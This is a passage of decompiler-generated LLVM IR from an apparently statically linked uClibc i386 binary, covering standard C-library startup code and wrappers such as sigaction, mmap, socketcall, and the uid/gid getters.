  %v3_804b6cd = add i32 %v3_804b6a2, 32
  br label %dec_label_pc_804b6c2

dec_label_pc_804b6c2:                             ; preds = %dec_label_pc_804b6c2.lr.ph, %dec_label_pc_804b6da
  %v1_804b6cd = phi i32 [ %v2_804b6dd2, %dec_label_pc_804b6c2.lr.ph ], [ %v2_804b6dd, %dec_label_pc_804b6da ]
  %v0_804b6cc = phi i32 [ %v1_804b6b9, %dec_label_pc_804b6c2.lr.ph ], [ %v1_804b6da, %dec_label_pc_804b6da ]
  %v6_804b6c7 = icmp ugt i32 %v1_804b6cd, 14
  br i1 %v6_804b6c7, label %dec_label_pc_804b6da, label %dec_label_pc_804b6c9

dec_label_pc_804b6c9:                             ; preds = %dec_label_pc_804b6c2
  %v0_804b6c9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804b6c9, i32* %stack_var_-160, align 4
  store i32 %v0_804b6cc, i32* %stack_var_-168, align 4
  %v2_804b6cd = mul i32 %v1_804b6cd, 8
  %v4_804b6cd = add i32 %v3_804b6cd, %v2_804b6cd
  %v3_804b6d2 = inttoptr i32 %v4_804b6cd to i16*
  %v4_804b6d2 = call i32 @memcpy(i16* %v3_804b6d2, i32 %v0_804b6cc, i32 8)
  %v0_804b6da.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804b6da

dec_label_pc_804b6da:                             ; preds = %dec_label_pc_804b6c2, %dec_label_pc_804b6c9
  %v0_804b6da = phi i32 [ %v0_804b6cc, %dec_label_pc_804b6c2 ], [ %v0_804b6da.pre, %dec_label_pc_804b6c9 ]
  %v1_804b6da = add i32 %v0_804b6da, 8
  store i32 %v1_804b6da, i32* @ebx, align 4
  %v1_804b6dd = inttoptr i32 %v1_804b6da to i32*
  %v2_804b6dd = load i32, i32* %v1_804b6dd, align 4
  %v3_804b6dd = icmp eq i32 %v2_804b6dd, 0
  %v1_804b6e0 = icmp eq i1 %v3_804b6dd, false
  br i1 %v1_804b6e0, label %dec_label_pc_804b6c2, label %dec_label_pc_804b6e2

dec_label_pc_804b6e2:                             ; preds = %dec_label_pc_804b6da, %dec_label_pc_804b6dd.preheader
  store i32 %v2_804b6a4, i32* @eax, align 4
  %v0_804b6e6 = call i32 @_dl_aux_init()
  store i32 %v0_804b6e6, i32* @eax, align 4
  %v0_804b6eb = call i32 @__GI___uClibc_init()
  %v1_804b6f4 = icmp eq i32 %tmp26, 0
  %v1_804b6f6 = icmp eq i1 %v1_804b6f4, false
  br i1 %v1_804b6f6, label %dec_label_pc_804b6fc, label %dec_label_pc_804b6f8

dec_label_pc_804b6f8:                             ; preds = %dec_label_pc_804b6e2
  %v1_804b6f8 = and i32 %tmp26, -65536
  %v2_804b6f8 = or i32 %v1_804b6f8, 4096
  br label %dec_label_pc_804b6fc

dec_label_pc_804b6fc:                             ; preds = %dec_label_pc_804b6e2, %dec_label_pc_804b6f8
  %v0_804b6fc = phi i32 [ %tmp26, %dec_label_pc_804b6e2 ], [ %v2_804b6f8, %dec_label_pc_804b6f8 ]
  store i32 %v0_804b6fc, i32* @global_var_8052510.75, align 16
  %v13_804b701 = icmp eq i32 %tmp25, -1
  %v1_804b706 = icmp eq i1 %v13_804b701, false
  br i1 %v1_804b706, label %dec_label_pc_804b731, label %dec_label_pc_804b708

dec_label_pc_804b708:                             ; preds = %dec_label_pc_804b6fc
  %v0_804b708 = call i32 @getuid()
  store i32 %v0_804b708, i32* @ebx, align 4
  %v0_804b70f = call i32 @geteuid()
  %v0_804b714 = load i32, i32* @ebx, align 4
  %v12_804b714 = icmp eq i32 %v0_804b714, %v0_804b70f
  %v1_804b716 = icmp eq i1 %v12_804b714, false
  br i1 %v1_804b716, label %dec_label_pc_804b747, label %dec_label_pc_804b718

dec_label_pc_804b718:                             ; preds = %dec_label_pc_804b708
  %v0_804b718 = call i32 @getgid()
  store i32 %v0_804b718, i32* @ebx, align 4
  %v0_804b71f = call i32 @getegid()
  %v0_804b724 = load i32, i32* @ebx, align 4
  %v12_804b724 = icmp eq i32 %v0_804b724, %v0_804b71f
  %v1_804b726 = icmp eq i1 %v12_804b724, false
  br i1 %v1_804b726, label %dec_label_pc_804b747, label %dec_label_pc_804b728.thread

dec_label_pc_804b728.thread:                      ; preds = %dec_label_pc_804b718
  br label %dec_label_pc_804b771

dec_label_pc_804b731:                             ; preds = %dec_label_pc_804b6fc
  %v15_804b731 = icmp eq i32 %tmp25, %tmp24
  %v1_804b735 = icmp eq i1 %v15_804b731, false
  br i1 %v1_804b735, label %dec_label_pc_804b747, label %dec_label_pc_804b737

dec_label_pc_804b737:                             ; preds = %dec_label_pc_804b731
  br label %dec_label_pc_804b747

dec_label_pc_804b747:                             ; preds = %dec_label_pc_804b737, %dec_label_pc_804b708, %dec_label_pc_804b731, %dec_label_pc_804b718
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_804b74e = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_804b75d = call i32 @__check_one_fd()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_804b76c = call i32 @__check_one_fd()
  br label %dec_label_pc_804b771

dec_label_pc_804b771:                             ; preds = %dec_label_pc_804b728.thread, %dec_label_pc_804b747
  store i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32* %esi.global-to-local, align 4
  %v0_804b776 = load i32, i32* @edi, align 4
  %v1_804b776 = inttoptr i32 %v0_804b776 to i32*
  %v2_804b776 = load i32, i32* %v1_804b776, align 4
  store i32 %v2_804b776, i32* bitcast (i32** @global_var_8052158.79 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_8052514.71, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b796, label %dec_label_pc_804b7c6.critedge

dec_label_pc_804b796:                             ; preds = %dec_label_pc_804b771, %dec_label_pc_804b796
  %v4_804b79645 = phi i32 [ %v1_804b79d, %dec_label_pc_804b796 ], [ 0, %dec_label_pc_804b771 ]
  store i32 ptrtoint (i32* @global_var_804b79d.80 to i32), i32* %stack_var_-160, align 4
  %v5_804b796 = mul i32 %v4_804b79645, 4
  %v6_804b796 = add i32 %v5_804b796, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b796 = inttoptr i32 %v6_804b796 to i32*
  %v8_804b796 = load i32, i32* %v7_804b796, align 4
  call void @__pseudo_call(i32 %v8_804b796)
  %v0_804b79d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b79d = add i32 %v0_804b79d, 1
  store i32 %v1_804b79d, i32* %ebx.global-to-local, align 4
  %v1_804b79e.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804b79e = icmp ult i32 %v1_804b79d, %v1_804b79e.pre
  br i1 %v7_804b79e, label %dec_label_pc_804b796, label %dec_label_pc_804b7a2

dec_label_pc_804b7a2:                             ; preds = %dec_label_pc_804b796
  store i32 134526888, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32 0), label %dec_label_pc_804b7ba, label %dec_label_pc_804b7c6

dec_label_pc_804b7ba:                             ; preds = %dec_label_pc_804b7a2, %dec_label_pc_804b7ba
  %v4_804b7ba44 = phi i32 [ %v1_804b7c1, %dec_label_pc_804b7ba ], [ 0, %dec_label_pc_804b7a2 ]
  store i32 ptrtoint (i32* @global_var_804b7c1.81 to i32), i32* %stack_var_-160, align 4
  %v5_804b7ba = mul i32 %v4_804b7ba44, 4
  %v6_804b7ba = add i32 %v5_804b7ba, ptrtoint (i32* @global_var_8052000.69 to i32)
  %v7_804b7ba = inttoptr i32 %v6_804b7ba to i32*
  %v8_804b7ba = load i32, i32* %v7_804b7ba, align 4
  call void @__pseudo_call(i32 %v8_804b7ba)
  %v0_804b7c1 = load i32, i32* @ebx, align 4
  %v1_804b7c1 = add i32 %v0_804b7c1, 1
  store i32 %v1_804b7c1, i32* @ebx, align 4
  %v1_804b7c2.pre = load i32, i32* %esi.global-to-local, align 4
  %v7_804b7c2 = icmp ult i32 %v1_804b7c1, %v1_804b7c2.pre
  br i1 %v7_804b7c2, label %dec_label_pc_804b7ba, label %dec_label_pc_804b7c6

dec_label_pc_804b7c6.critedge:                    ; preds = %dec_label_pc_804b771
  store i32 134526888, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* @ebx, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b7c6

dec_label_pc_804b7c6:                             ; preds = %dec_label_pc_804b7c6.critedge, %dec_label_pc_804b7ba, %dec_label_pc_804b7a2
  %v0_804b7cf = load i32, i32* %stack_var_-160, align 4
  %v1_804b7cf = call i32 @__errno_location(i32 %v0_804b7cf)
  %v1_804b7d4 = inttoptr i32 %v1_804b7cf to i32*
  store i32 0, i32* %v1_804b7d4, align 4
  %v0_804b7e3 = call i32 @__GI___h_errno_location()
  store i32 %v0_804b7e3, i32* @eax, align 4
  %v1_804b7e8 = inttoptr i32 %v0_804b7e3 to i32*
  store i32 0, i32* %v1_804b7e8, align 4
  %v0_804b7ee = load i32, i32* @eax, align 4
  store i32 %v0_804b7ee, i32* %stack_var_-160, align 4
  %v0_804b7f5 = load i32, i32* @edi, align 4
  store i32 %v0_804b7f5, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_804b804 = load i32, i32* @eax, align 4
  %v1_804b807 = call i32 @__GI_exit(i32 %v0_804b804)
  %v0_804b811 = load i32, i32* @ebx, align 4
  %v1_804b811 = inttoptr i32 %v0_804b811 to %sigcontext*
  %v2_804b811 = call i32 @sigreturn(%sigcontext* %v1_804b811)
  %v0_804b819 = load i32, i32* @ebx, align 4
  %v1_804b819 = inttoptr i32 %v0_804b819 to %sigcontext*
  %v2_804b819 = call i32 @sigreturn(%sigcontext* %v1_804b819)
  ret i32 %v2_804b819

; uselistorder directives
  uselistorder i32 %v1_804b7c1, { 1, 2, 0 }
  uselistorder i32 %v1_804b79d, { 1, 2, 0 }
  uselistorder i32 %v2_804b6dd, { 1, 0 }
  uselistorder i32 %v1_804b6da, { 2, 1, 0 }
  uselistorder i32 %v1_804b6b9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804b6b6, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 2, 1, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 2, 1 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8052000.69 to i32), i32 -134553600), i32 2), { 0, 3, 1, 5, 4, 2 }
  uselistorder i32 ()* @__check_one_fd, { 1, 0, 2 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b7ba, { 1, 0 }
  uselistorder label %dec_label_pc_804b796, { 1, 0 }
  uselistorder label %dec_label_pc_804b771, { 1, 0 }
  uselistorder label %dec_label_pc_804b747, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804b6fc, { 1, 0 }
  uselistorder label %dec_label_pc_804b6da, { 1, 0 }
  uselistorder label %dec_label_pc_804b6c2, { 1, 0 }
  uselistorder label %dec_label_pc_804b69f, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804b81b = load i32, i32* @esi, align 4
  %v0_804b81c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804b831 = icmp eq i32* %arg2, null
  br i1 %v1_804b831, label %dec_label_pc_804b884, label %dec_label_pc_804b835

dec_label_pc_804b835:                             ; preds = %entry
  %v2_804b835 = load i32, i32* %arg2, align 4
  store i32 %v2_804b835, i32* %stack_var_-148, align 4
  %v1_804b83e = add i32 %tmp11, 4
  %v3_804b850 = bitcast i32* %stack_var_-136 to i16*
  %v4_804b850 = call i32 @memcpy(i16* %v3_804b850, i32 %v1_804b83e, i32 128)
  %v1_804b855 = add i32 %tmp11, 132
  %v2_804b86f = inttoptr i32 %v1_804b855 to i8*
  %v3_804b86f = load i8, i8* %v2_804b86f, align 1
  %v4_804b86f = and i8 %v3_804b86f, 4
  %v5_804b86f = icmp eq i8 %v4_804b86f, 0
  %v1_804b876 = icmp eq i1 %v5_804b86f, false
  br i1 %v1_804b876, label %dec_label_pc_804b884, label %dec_label_pc_804b878

dec_label_pc_804b878:                             ; preds = %dec_label_pc_804b835
  br label %dec_label_pc_804b884

dec_label_pc_804b884:                             ; preds = %dec_label_pc_804b878, %dec_label_pc_804b835, %entry
  %v1_804b886 = icmp eq i32 %arg3, 0
  br i1 %v1_804b886, label %dec_label_pc_804b88e, label %dec_label_pc_804b88a

dec_label_pc_804b88a:                             ; preds = %dec_label_pc_804b884
  %v2_804b88a = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804b88e

dec_label_pc_804b88e:                             ; preds = %dec_label_pc_804b884, %dec_label_pc_804b88a
  %v0_804b89d = phi i32 [ 0, %dec_label_pc_804b884 ], [ %v2_804b88a, %dec_label_pc_804b88a ]
  br i1 %v1_804b831, label %dec_label_pc_804b89b, label %dec_label_pc_804b894

dec_label_pc_804b894:                             ; preds = %dec_label_pc_804b88e
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804b89b

dec_label_pc_804b89b:                             ; preds = %dec_label_pc_804b88e, %dec_label_pc_804b894
  %v0_804b89e = phi %sigaction* [ null, %dec_label_pc_804b88e ], [ %phitmp, %dec_label_pc_804b894 ]
  %v5_804b8a6 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_804b89e, i32 %v0_804b89d, i32 8)
  store i32 %v5_804b8a6, i32* %ebx.global-to-local, align 4
  br i1 %v1_804b886, label %dec_label_pc_804b8e9, label %dec_label_pc_804b8b4

dec_label_pc_804b8b4:                             ; preds = %dec_label_pc_804b89b
  %v2_804b8b4 = icmp slt i32 %v5_804b8a6, 0
  br i1 %v2_804b8b4, label %dec_label_pc_804b8e9, label %dec_label_pc_804b8b8

dec_label_pc_804b8b8:                             ; preds = %dec_label_pc_804b8b4
  %v3_804b8b8 = load i32, i32* %stack_var_-288, align 4
  %v2_804b8bc = inttoptr i32 %arg3 to i32*
  store i32 %v3_804b8b8, i32* %v2_804b8bc, align 4
  %v2_804b8c4 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804b8c9 = add i32 %arg3, 4
  %v3_804b8cd = inttoptr i32 %v1_804b8c9 to i16*
  %v4_804b8cd = call i32 @memcpy(i16* %v3_804b8cd, i32 %v2_804b8c4, i32 128)
  %v2_804b8d6 = add i32 %arg3, 132
  %v3_804b8d6 = inttoptr i32 %v2_804b8d6 to i32*
  %v2_804b8e3 = add i32 %arg3, 136
  %v3_804b8e3 = inttoptr i32 %v2_804b8e3 to i32*
  %v0_804b8e9.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b8e9

dec_label_pc_804b8e9:                             ; preds = %dec_label_pc_804b8b4, %dec_label_pc_804b89b, %dec_label_pc_804b8b8
  %v0_804b8e9 = phi i32 [ %v5_804b8a6, %dec_label_pc_804b8b4 ], [ %v5_804b8a6, %dec_label_pc_804b89b ], [ %v0_804b8e9.pre, %dec_label_pc_804b8b8 ]
  store i32 %v0_804b81c, i32* @ebx, align 4
  store i32 %v0_804b81b, i32* @esi, align 4
  ret i32 %v0_804b8e9

; uselistorder directives
  uselistorder i32 %v5_804b8a6, { 0, 1, 3, 2 }
  uselistorder i1 %v1_804b886, { 1, 0 }
  uselistorder i1 %v1_804b831, { 1, 0 }
  uselistorder i32* null, { 0, 3, 4, 5, 6, 1, 2, 7 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_804b8e9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b89b, { 1, 0 }
  uselistorder label %dec_label_pc_804b88e, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_804b8f4 = load i32, i32* @ebx, align 4
  %v2_804b8fb = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_804b8fb, i32* @ebx, align 4
  %v8_804b8ff = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804b8f4, i32* @ebx, align 4
  %v3_804b908 = icmp ugt i32 %v8_804b8ff, -4096
  call void @__pseudo_cond_branch(i1 %v3_804b908, i32 134531120)
  ret i32 %v8_804b8ff

; uselistorder directives
  uselistorder i32 %v8_804b8ff, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @mmap, { 2, 1, 0 }
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b910 = load i32, i32* @ebx, align 4
  store i32 %v0_804b910, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804b923 = call i32 @int80_syscall(i32 102)
  store i32 %v1_804b923, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804b923, -4095
  br i1 %tmp8, label %dec_label_pc_804b93c, label %dec_label_pc_804b930

dec_label_pc_804b930:                             ; preds = %entry
  %v0_804b930 = load i32, i32* %stack_var_-4, align 4
  %v1_804b930 = call i32 @__errno_location(i32 %v0_804b930)
  %v0_804b935 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b935 = sub i32 0, %v0_804b935
  %v2_804b937 = inttoptr i32 %v1_804b930 to i32*
  store i32 %v1_804b935, i32* %v2_804b937, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b93c

dec_label_pc_804b93c:                             ; preds = %entry, %dec_label_pc_804b930
  %v0_804b93c = phi i32 [ %v1_804b923, %entry ], [ -1, %dec_label_pc_804b930 ]
  %v2_804b93e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b93e, i32* @edx, align 4
  %v2_804b940 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b940, i32* @ebx, align 4
  ret i32 %v0_804b93c

; uselistorder directives
  uselistorder i32 %v1_804b923, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b93c, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804b945 = load i32, i32* @esi, align 4
  store i32 %v0_804b945, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804b959 = load i32, i32* @ebx, align 4
  %v7_804b961 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804b961, i32* %esi.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_804b961, -4095
  br i1 %tmp13, label %dec_label_pc_804b979, label %dec_label_pc_804b96d

dec_label_pc_804b96d:                             ; preds = %entry
  %v1_804b96d = call i32 @__errno_location(i32 %v0_804b959)
  %v0_804b972 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b972 = sub i32 0, %v0_804b972
  %v2_804b974 = inttoptr i32 %v1_804b96d to i32*
  store i32 %v1_804b972, i32* %v2_804b974, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b979

dec_label_pc_804b979:                             ; preds = %entry, %dec_label_pc_804b96d
  %v0_804b979 = phi i32 [ %v7_804b961, %entry ], [ -1, %dec_label_pc_804b96d ]
  %v2_804b97c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b97c, i32* @esi, align 4
  ret i32 %v0_804b979

; uselistorder directives
  uselistorder i32 %v7_804b961, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b979, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b980 = load i32, i32* @ebx, align 4
  store i32 %v0_804b980, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804b993 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804b993, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v4_804b993, -4095
  br i1 %tmp9, label %dec_label_pc_804b9ac, label %dec_label_pc_804b9a0

dec_label_pc_804b9a0:                             ; preds = %entry
  %v0_804b9a0 = load i32, i32* %stack_var_-4, align 4
  %v1_804b9a0 = call i32 @__errno_location(i32 %v0_804b9a0)
  %v0_804b9a5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b9a5 = sub i32 0, %v0_804b9a5
  %v2_804b9a7 = inttoptr i32 %v1_804b9a0 to i32*
  store i32 %v1_804b9a5, i32* %v2_804b9a7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b9ac

dec_label_pc_804b9ac:                             ; preds = %entry, %dec_label_pc_804b9a0
  %v0_804b9ac = phi i32 [ %v4_804b993, %entry ], [ -1, %dec_label_pc_804b9a0 ]
  %v2_804b9ae = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b9ae, i32* @edx, align 4
  %v2_804b9b0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b9b0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804b9ac

; uselistorder directives
  uselistorder i32 %v4_804b993, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b9ac, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804b9b7 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804b9be = call i32 @getrlimit(i32 7, i32 %v2_804b9b7)
  store i32 256, i32* @edx, align 4
  %v2_804b9cb = icmp slt i32 %v2_804b9be, 0
  br i1 %v2_804b9cb, label %dec_label_pc_804b9d3, label %dec_label_pc_804b9cf

dec_label_pc_804b9cf:                             ; preds = %entry
  %v3_804b9cf = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804b9cf, i32* @edx, align 4
  br label %dec_label_pc_804b9d3

dec_label_pc_804b9d3:                             ; preds = %entry, %dec_label_pc_804b9cf
  %v0_804b9d3 = phi i32 [ 256, %entry ], [ %v3_804b9cf, %dec_label_pc_804b9cf ]
  ret i32 %v0_804b9d3

; uselistorder directives
  uselistorder label %dec_label_pc_804b9d3, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b9dc = load i32, i32* @ebx, align 4
  store i32 %v0_804b9dc, i32* %stack_var_-4, align 4
  %v1_804b9e5 = call i32 @int80_syscall(i32 202)
  store i32 %v1_804b9e5, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804b9e5, -4095
  br i1 %tmp6, label %dec_label_pc_804b9fc, label %dec_label_pc_804b9f0

dec_label_pc_804b9f0:                             ; preds = %entry
  %v0_804b9f0 = load i32, i32* %stack_var_-4, align 4
  %v1_804b9f0 = call i32 @__errno_location(i32 %v0_804b9f0)
  %v0_804b9f5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b9f5 = sub i32 0, %v0_804b9f5
  %v2_804b9f7 = inttoptr i32 %v1_804b9f0 to i32*
  store i32 %v1_804b9f5, i32* %v2_804b9f7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b9fc

dec_label_pc_804b9fc:                             ; preds = %entry, %dec_label_pc_804b9f0
  %v0_804b9fc = phi i32 [ %v1_804b9e5, %entry ], [ -1, %dec_label_pc_804b9f0 ]
  %v2_804ba00 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ba00, i32* @ebx, align 4
  ret i32 %v0_804b9fc

; uselistorder directives
  uselistorder i32 %v1_804b9e5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b9fc, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba04 = load i32, i32* @ebx, align 4
  store i32 %v0_804ba04, i32* %stack_var_-4, align 4
  %v1_804ba0d = call i32 @int80_syscall(i32 201)
  store i32 %v1_804ba0d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804ba0d, -4095
  br i1 %tmp6, label %dec_label_pc_804ba24, label %dec_label_pc_804ba18

dec_label_pc_804ba18:                             ; preds = %entry
  %v0_804ba18 = load i32, i32* %stack_var_-4, align 4
  %v1_804ba18 = call i32 @__errno_location(i32 %v0_804ba18)
  %v0_804ba1d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ba1d = sub i32 0, %v0_804ba1d
  %v2_804ba1f = inttoptr i32 %v1_804ba18 to i32*
  store i32 %v1_804ba1d, i32* %v2_804ba1f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ba24

dec_label_pc_804ba24:                             ; preds = %entry, %dec_label_pc_804ba18
  %v0_804ba24 = phi i32 [ %v1_804ba0d, %entry ], [ -1, %dec_label_pc_804ba18 ]
  %v2_804ba28 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ba28, i32* @ebx, align 4
  ret i32 %v0_804ba24

; uselistorder directives
  uselistorder i32 %v1_804ba0d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ba24, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ba2c = load i32, i32* @ebx, align 4
  store i32 %v0_804ba2c, i32* %stack_var_-4, align 4
  %v1_804ba35 = call i32 @int80_syscall(i32 200)
  store i32 %v1_804ba35, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804ba35, -4095
  br i1 %tmp6, label %dec_label_pc_804ba4c, label %dec_label_pc_804ba40

dec_label_pc_804ba40:                             ; preds = %entry
  %v0_804ba40 = load i32, i32* %stack_var_-4, align 4
  %v1_804ba40 = call i32 @__errno_location(i32 %v0_804ba40)
  %v0_804ba45 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ba45 = sub i32 0, %v0_804ba45
  %v2_804ba47 = inttoptr i32 %v1_804ba40 to i32*
  store i32 %v1_804ba45, i32* %v2_804ba47, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ba4c

dec_label_pc_804ba4c:                             ; preds = %entry, %dec_label_pc_804ba40
  %v0_804ba4c = phi i32 [ %v1_804ba35, %entry ], [ -1, %dec_label_pc_804ba40 ]
  %v2_804ba50 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ba50, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ba4c

; uselistorder directives
  uselistorder i32 %v1_804ba35, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ba4c, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v0_804ba54 = load i32, i32* @global_var_8052510.75, align 16
  %v1_804ba5e = icmp eq i32 %v0_804ba54, 0
  br i1 %v1_804ba5e, label %dec_label_pc_804ba64, label %dec_label_pc_804ba62

dec_label_pc_804ba62:                             ; preds = %entry
  br label %dec_label_pc_804ba64

dec_label_pc_804ba64:                             ; preds = %entry, %dec_label_pc_804ba62
  %storemerge = phi i32 [ %v0_804ba54, %dec_label_pc_804ba62 ], [ 4096, %entry ]
  %v0_804ba64 = phi i32 [ %v0_804ba54, %dec_label_pc_804ba62 ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
